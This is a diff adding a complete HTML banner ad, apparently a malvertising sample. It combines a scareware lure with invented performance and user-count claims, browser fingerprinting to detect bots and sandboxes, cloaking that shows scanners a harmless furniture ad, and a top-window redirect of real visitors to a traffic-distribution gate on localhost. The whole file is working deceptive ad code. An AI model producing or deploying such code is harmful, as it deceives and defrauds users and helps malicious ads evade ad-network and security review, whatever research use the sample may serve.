@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ad</title>
+<style>
+  body{margin:0;font-family:'Segoe UI',Arial,sans-serif}
+  .ad{width:728px;height:90px;display:flex;align-items:center;
+      background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);cursor:pointer;
+      border-radius:6px;overflow:hidden;position:relative}
+  .icon{font-size:36px;margin:0 18px}
+  .txt{color:#fff}
+  .txt h3{margin:0;font-size:18px}
+  .txt p{margin:2px 0 0;font-size:12px;opacity:.85}
+  .btn{margin-left:auto;margin-right:16px;background:#27ae60;color:#fff;
+       padding:9px 22px;border-radius:22px;font-weight:600;font-size:14px;
+       box-shadow:0 2px 6px rgba(0,0,0,.3);animation:pulse 1.6s infinite}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+  .tag{position:absolute;bottom:2px;right:6px;font-size:9px;color:rgba(255,255,255,.6)}
+  .badge{position:absolute;top:0;left:0;background:#e74c3c;color:#fff;font-size:10px;
+         padding:2px 8px;border-radius:0 0 6px 0;font-weight:bold}
+</style></head>
+<body>
+<div class="ad" onclick="begin()">
+  <div class="badge">AD</div>
+  <div class="icon">&#9888;</div>
+  <div class="txt">
+    <h3>Your PC performance is 43% below optimal</h3>
+    <p>3,847 users in your area fixed this today — scan takes 2 minutes</p>
+  </div>
+  <div class="btn">FIX NOW &#9656;</div>
+  <div class="tag">Sponsored · PCBoosterPro</div>
+</div>
+
+<script>
+// ===== Stage 1: Fingerprinting (bot/sandbox detection) =====
+function fingerprint() {
+  const fp = {
+    screen: screen.width + "x" + screen.height,
+    webdriver: navigator.webdriver,
+    plugins: navigator.plugins.length,
+    langs: navigator.languages ? navigator.languages.length : 0
+  };
+  if (fp.webdriver === true || fp.plugins === 0) return "bot";
+  if (fp.screen === "0x0" || fp.screen === "800x600") return "bot";
+  return "user";
+}
+
+// ===== Stage 2: Cloaking + TDS chain entry =====
+function begin() {
+  if (fingerprint() === "bot") {
+    document.querySelector(".txt h3").textContent = "Summer furniture sale — up to 50% off";
+    document.querySelector(".txt p").textContent = "Handcrafted pieces. Free delivery this week.";
+    document.querySelector(".btn").textContent = "SHOP NOW";
+    return;
+  }
+  const ts = Date.now().toString(36);   // cache-buster
+  window.top.location = "http://localhost:8081/gate?c=" + ts;
+}
+</script>
+</body></html>
